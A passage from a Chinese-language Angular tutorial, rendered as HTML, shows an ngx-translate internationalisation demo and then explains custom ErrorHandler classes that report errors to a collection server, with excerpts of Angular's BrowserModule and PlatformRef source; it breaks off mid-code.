<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateModule<span class="token punctuation">,</span> TranslateLoader <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateHttpLoader <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/http-loader&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> AppComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./app.component&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HomeComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./home.component&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> routes<span class="token operator">:</span> Route<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>
    pathMatch<span class="token operator">:</span> <span class="token string">&quot;full&quot;</span><span class="token punctuation">,</span>
    redirectTo<span class="token operator">:</span> <span class="token string">&quot;home&quot;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">&quot;home&quot;</span><span class="token punctuation">,</span>
    component<span class="token operator">:</span> HomeComponent
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">&quot;user&quot;</span><span class="token punctuation">,</span>
    loadChildren<span class="token operator">:</span> <span class="token string">&quot;./user/user.module#UserModule&quot;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">// 支持AOT</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">createTranslateLoader</span><span class="token punctuation">(</span><span class="token parameter">http<span class="token operator">:</span> HttpClient</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TranslateHttpLoader</span><span class="token punctuation">(</span>http<span class="token punctuation">,</span> <span class="token string">&quot;./assets/i18n/&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;.json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">,</span> HomeComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    BrowserModule<span class="token punctuation">,</span>
    HttpClientModule<span class="token punctuation">,</span>
    RouterModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span>routes<span class="token punctuation">)</span><span class="token punctuation">,</span>
    TranslateModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      loader<span class="token operator">:</span> <span class="token punctuation">{</span>
        provide<span class="token operator">:</span> TranslateLoader<span class="token punctuation">,</span>
        useFactory<span class="token operator">:</span> createTranslateLoader<span class="token punctuation">,</span>
        deps<span class="token operator">:</span> <span class="token punctuation">[</span>HttpClient<span class="token punctuation">]</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/core&quot;</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-root&quot;</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div class=&quot;app&quot;&gt;
      &lt;nav&gt;
        &lt;a routerLink=&quot;/&quot;&gt;首页&lt;/a&gt;
        &lt;a routerLink=&quot;/user&quot;&gt;我的&lt;/a&gt;
      &lt;/nav&gt;
      &lt;router-outlet&gt;&lt;/router-outlet&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;./app.component.css&quot;</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  title <span class="token operator">=</span> <span class="token string">&quot;ngx-translate-demo&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// home.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/core&quot;</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-home&quot;</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  &lt;div style=&quot;text-align:center&quot;&gt;
    &lt;h1&gt;
        Welcome to {{ title }}!
    &lt;/h1&gt;
    &lt;p&gt;{{&quot;home&quot; | translate}}&lt;/p&gt;
    &lt;p&gt;
      &lt;button (click)=&quot;useZhCn()&quot;&gt;中文简体&lt;/button&gt;
      &lt;button (click)=&quot;useZhHk()&quot;&gt;中文繁体&lt;/button&gt;
      &lt;button (click)=&quot;useEn()&quot;&gt;英语&lt;/button&gt;
    &lt;/p&gt;
  &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">HomeComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  title <span class="token operator">=</span> <span class="token string">&quot;ngx-translate-demo&quot;</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> translate<span class="token operator">:</span> TranslateService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 设置默认的语言</span>
    translate<span class="token punctuation">.</span><span class="token function">setDefaultLang</span><span class="token punctuation">(</span><span class="token string">&quot;zh-cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;zh-cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;hello&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> value<span class="token operator">:</span> <span class="token string">&quot;world&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//=&gt; 'hello world'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">useZhCn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;zh-cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">useZhHk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;zh-hk&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">useEn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;en&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br></div></div><h2 id="异常处理"><a href="#异常处理" class="header-anchor">#</a> 异常处理</h2> <p>对于 Angular 应用程序，默认的异常处理是在控制台中输出异常，这对于本地开发和测试阶段，是很方便。但这对于线上环境来说，输出到控制台没有多大的意义。一般情况下，我们希望能自动收集线上环境抛出的异常，并上报到指定的异常收集服务器上，以便于对异常信息进行汇总和分析。</p> <p>针对上述的需求，我们可以利用 Angular 为我们提供的钩子，来实现自定义异常处理器：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">MyErrorHandler</span> <span class="token keyword">implements</span> <span class="token class-name">ErrorHandler</span> <span class="token punctuation">{</span>
  <span class="token function">handleError</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// do something with the exception</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>provide<span class="token operator">:</span> ErrorHandler<span class="token punctuation">,</span> useClass<span class="token operator">:</span> MyErrorHandler<span class="token punctuation">}</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">MyModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>通过上面的示例，我们知道要自定义异常处理器需要两个步骤：</p> <ul><li>创建异常处理类并实现 ErrorHandler：</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> declare <span class="token keyword">class</span> <span class="token class-name">ErrorHandler</span> <span class="token punctuation">{</span>
    <span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ol start="2"><li>以 ErrorHandler 作为 Token，使用 useClass 的方式配置 provider。</li></ol> <h3 id="自定义异常处理器"><a href="#自定义异常处理器" class="header-anchor">#</a> 自定义异常处理器</h3> <p>下面我们来根据上述的流程，自定义一个简单的异常处理器，实现自动提交异常信息的功能。这里我们先来定义一个 ErrorService：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpClient <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> mapTo <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;rxjs/operators&quot;</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">&quot;root&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ErrorService</span> <span class="token punctuation">{</span>
  errorServerUrl<span class="token operator">:</span> <span class="token string">&quot;http://xxx.com/&quot;</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> http<span class="token operator">:</span> HttpClient</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">postError</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>http
      <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>errorServerUrl<span class="token punctuation">,</span> error<span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">mapTo</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Error has been submited&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>接下来定义一个异常处理类：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> ErrorHandler <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ErrorService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./error.service&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">MyErrorHandler</span> <span class="token keyword">implements</span> <span class="token class-name">ErrorHandler</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> errorService<span class="token operator">:</span> ErrorService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">handleError</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>errorService<span class="token punctuation">.</span><span class="token function">postError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>最后我们还需要配置一下 Provider：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">,</span> HttpClientModule<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>BrowserModule<span class="token punctuation">]</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
      provide<span class="token operator">:</span> ErrorHandler<span class="token punctuation">,</span>
      useClass<span class="token operator">:</span> MyErrorHandler
    <span class="token punctuation">}</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>经过上面的几个步骤，一个简单的异常器就完成了。其实目前市面上也有一些不错的异常监控平台，比如 FunDebug，该平台提供的功能还是蛮强大的，支持 Angular 或 Ionic 项目。</p> <h3 id="异常处理机制"><a href="#异常处理机制" class="header-anchor">#</a> 异常处理机制</h3> <h4 id="默认异常处理器"><a href="#默认异常处理器" class="header-anchor">#</a> 默认异常处理器</h4> <p>通过浏览 Angular 源码，我们发现在 BrowserModule 模块中会注册默认的 ErrorHandler 处理器：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// packages/platform-browser/src/browser.ts</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">BROWSER_MODULE_PROVIDERS</span><span class="token operator">:</span> StaticProvider<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token constant">BROWSER_SANITIZATION_PROVIDERS</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>provide<span class="token operator">:</span> ErrorHandler<span class="token punctuation">,</span> useFactory<span class="token operator">:</span> errorHandler<span class="token punctuation">,</span> deps<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 👈  </span>
  <span class="token comment">// ...</span>
<span class="token punctuation">]</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">errorHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> ErrorHandler <span class="token punctuation">{</span>  <span class="token comment">// 👈  </span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ErrorHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>BrowserModule 模块的定义：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// packages/platform-browser/src/browser.ts</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    providers<span class="token operator">:</span> <span class="token constant">BROWSER_MODULE_PROVIDERS</span><span class="token punctuation">,</span>  <span class="token comment">// 👈  </span>
    exports<span class="token operator">:</span> <span class="token punctuation">[</span>CommonModule<span class="token punctuation">,</span> ApplicationModule<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">BrowserModule</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">SkipSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Inject</span><span class="token punctuation">(</span>BrowserModule<span class="token punctuation">)</span> parentModule<span class="token operator">:</span> BrowserModule<span class="token operator">|</span><span class="token keyword">null</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>parentModule<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
          <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">BrowserModule has already been loaded. If you need access to common directives such as NgIf and NgFor from a lazy loaded module, import CommonModule instead.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>在main.ts 中,我们通过调用 platformBrowserDynamic() 返回对象上的 bootstrapModule() 方法来启动我们应用程序。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> enableProdMode <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> platformBrowserDynamic <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser-dynamic'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> AppModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./app/app.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> environment <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./environments/environment'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>environment<span class="token punctuation">.</span>production<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">enableProdMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">platformBrowserDynamic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bootstrapModule</span><span class="token punctuation">(</span>AppModule<span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>其中 platformBrowserDynamic 定义如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> declare <span class="token keyword">const</span> <span class="token function-variable function">platformBrowserDynamic</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">extraProviders<span class="token operator">?</span><span class="token operator">:</span> StaticProvider<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token keyword">undefined</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> PlatformRef<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这时我就知道调用 platformBrowserDynamic() 方法后会返回 PlatformRef 对象。因此现在我们的主要目标就是分析 PlatformRef 对象，PlatformRef 类 bootstrapModule() 方法的定义如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">PlatformRef</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> _modules<span class="token operator">:</span> NgModuleRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/** @internal */</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> _injector<span class="token operator">:</span> Injector</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  
  bootstrapModule<span class="token operator">&lt;</span><span class="token constant">M</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>
